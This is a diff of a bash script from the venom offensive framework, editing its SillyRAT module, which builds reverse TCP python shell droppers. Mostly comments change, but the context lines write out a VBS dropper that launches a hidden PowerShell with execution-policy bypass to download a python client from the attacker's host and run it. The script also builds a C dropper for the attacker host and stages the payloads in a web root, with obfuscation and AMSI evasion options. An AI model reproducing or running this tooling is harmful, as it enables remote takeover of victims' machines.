@@ -10208,10 +10208,11 @@ fi
 
 
 
-# ------------------------------------------
-# SillyRAT (reverse TCP python shell)
+# ---------------------------------------------------
+# SillyRAT Multi-Platforms (reverse TCP python shell)
 # https://github.com/r00t-3xp10it/venom/tree/master/bin/SillyRAT
-# ------------------------------------------
+# This Module works in categorie nº3 (exe dropper) or categorie nº8 (vbs dropper)
+# ---------------------------------------------------
 sh_shellcode27 () {
 Colors;
 
@@ -10304,6 +10305,7 @@ else # Mac or multi-platforms
    dropperpath="NULL (pure python Client)"
 fi
 
+
 ## Display final settings to user.
 if [ "$vbsevasion" = "ON" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2;fi
 echo ${BlueF}"---"
@@ -10327,7 +10329,7 @@ if [ "$SOSP" = "Windows" ]; then
    # requirements in target system before executing the Client.py remote.
    easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
-      ## Build dropper.vbs (OBFUSCATION=ON)
+      ## Build dropper.vbs (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
       echo "${BlueF}[☠]${white} Creating dropper VBS Program."${Reset};sleep 2
       echo "' Author: r00t-3xp10it [SSA RedTeam @2020]" > $Drop.vbs
       echo "' Framework: Venom v1.0.17 - Multi-OS - Agent nº5" >> $Drop.vbs
@@ -10339,7 +10341,7 @@ if [ "$SOSP" = "Windows" ]; then
       echo "objShell.Run \"cmd /c powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://$lhost/$Drop.py', '$rpath\\$Drop.py') && cd $rpath && python $Drop.py\", 0, True" >> $Drop.vbs
       echo "${BlueF}[☠]${white} $Drop.vbs written to output."${Reset};sleep 2
    else
-      ## Build dropper.exe (default - flagged by AV)
+      ## Build dropper.exe [flagged by AV] (default in categorie nº3 - Agent nº5)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
       cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
       sed -i "s|LhOsT|$lhost|g" dropper.c
@@ -10421,7 +10423,7 @@ elif [ "$SOSP" = "Linux" ]; then
       # rm $IPATH/output/$Drop.c > /dev/nul 2>&1
 
 else
-: ## If 'Cancel' OR 'Mac' options sellected => Only Client.py its deliver insted of dropper.
+: ## If 'Cancel' OR 'Mac' options sellected => Client.py its deliver insted of dropper.(exe|vbs)
 fi
 
 
@@ -10455,7 +10457,7 @@ elif [ "$SOSP" = "Linux" ]; then
    zip $Drop.zip $Drop > /dev/nul 2>&1 # ZIP dropper.c
    cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
    mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
-else
+else # Mac or multi-platforms
    zip $Drop.zip $Drop.py > /dev/nul 2>&1 # ZIP rev tcp Client shell
    mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # rev tcp Client shell ziped
 fi
